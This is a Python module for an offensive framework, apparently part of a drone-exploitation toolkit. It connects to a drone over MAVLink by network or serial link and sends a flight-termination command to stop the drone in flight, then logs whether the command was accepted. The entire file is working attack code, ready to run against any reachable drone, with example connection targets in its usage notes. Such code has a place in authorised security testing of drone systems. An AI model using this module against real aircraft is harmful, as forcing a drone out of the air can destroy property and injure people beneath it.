from sploitkit import Config
from lib.base import MAVLinkModule
from pymavlink import mavutil
import sys

class FlightTermination(MAVLinkModule):
    """
    Forcefully terminate the drone's flight.

    Connection:
        Supports both network and serial connections:
        - Network: udp:192.168.1.1:14550 or tcp:192.168.1.1:5760
        - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)

    Usage:
        set connection tcp:10.13.0.3:5760
        run

        OR

        set connection /dev/ttyUSB0
        set baud 57600
        run
    """

    # Inherit connection config from base class
    config = MAVLinkModule.config + Config({})

    def execute_flight_termination(self, master):
        """
        Send the MAV_CMD_DO_FLIGHTTERMINATION command to terminate the flight.
        """
        master.mav.command_long_send(
            master.target_system,                # Target system ID
            master.target_component,             # Target component ID
            mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION, # Command ID for flight termination
            0,                                   # Confirmation
            1,                                   # Param1: 1 to initiate flight termination
            0, 0, 0, 0, 0, 0                     # Other params unused
        )
        self.logger.info("Flight termination command sent.")

    def run(self):
        # Connect to the drone using base class method (supports both serial and network)
        master = self.connect_drone()

        try:
            # Execute the flight termination
            self.execute_flight_termination(master)

            # Monitor the drone's status
            while True:
                msg = master.recv_match(blocking=True)
                if not msg:
                    continue
                self.logger.info(f"Received message: {msg}")
                if msg.get_type() == 'COMMAND_ACK':
                    if msg.command == mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION:
                        if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                            self.logger.success("Flight termination command accepted.")
                        else:
                            self.logger.failure(f"Failed to execute flight termination command: {msg.result}")
                    break
        finally:
            # Clean up connection
            self.close_connection(master)